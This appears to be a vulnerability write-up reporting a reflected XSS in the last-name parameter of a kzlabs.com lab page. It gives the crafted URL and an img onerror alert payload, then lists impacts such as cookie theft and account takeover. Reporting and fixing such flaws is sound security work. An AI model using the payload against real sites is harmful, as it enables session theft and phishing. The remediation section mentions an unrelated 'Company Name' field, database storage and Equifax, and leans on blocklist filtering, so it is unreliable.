
## Title
Reflected XSS in Last Name 

## Vulnerability Type
Reflected XSS

## Summary
The kzlabs.com/punishment page has an Reflected XSS vulnerability in the Last Name whatever you type into the Last Name gets embedded raw into a page response with no sanitization, By injecting an HTML tag with an event handler arbitary JavaScript executes immediately when they visit crafted URL
## Vulnerable Endpoint
```
http://kzlabs.com/punishment/18.php?lname
```

## Steps to Reproduce
1. Go to the following crafted URL
```
http://kzlabs.com/punishment/18.php?fname=&lname=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E
```
3.Wait for the page to load

4.An alert popup appears showing 1


## Payload Used
```
"><img src=x onerror=alert(1)>
```

## Proof of Concept

**Screenshot 1** — URL bar showing payload injected directly into the Lname with the response refelcting raw in the page source without any sanitization 


<img width="1184" height="935" alt="image" src="https://github.com/user-attachments/assets/00e08d9c-737d-4400-9844-70210327b6da" />



**Screenshot 2** — Alert box displaying 1 triggered after submitting the payload "><img src=x onerror=alert(1)> ,with the payload visible in the URL bar confirming reflected XSS execution in the browser.


<img width="1442" height="909" alt="image" src="https://github.com/user-attachments/assets/4d241927-6a52-4548-a7ea-5f6ca057ebd9" />



## Impact
- Cookie stealing 
- Account takeover by sending crafted link to victim
- JavaScript execution in victim browser
- Can be used to redirect victims to fake login pages that look identical to Equifax to harvest credentials


## Remediation
1. Filter out dangerous HTML tags like `<script>`, `<img>`, `<svg>` from the Company Name field before saving anything to the database
2. Filter out JavaScript methods like `alert()`, `confirm()`, `prompt()` and block external script sources from being injected through input fields
3. If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
5. Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
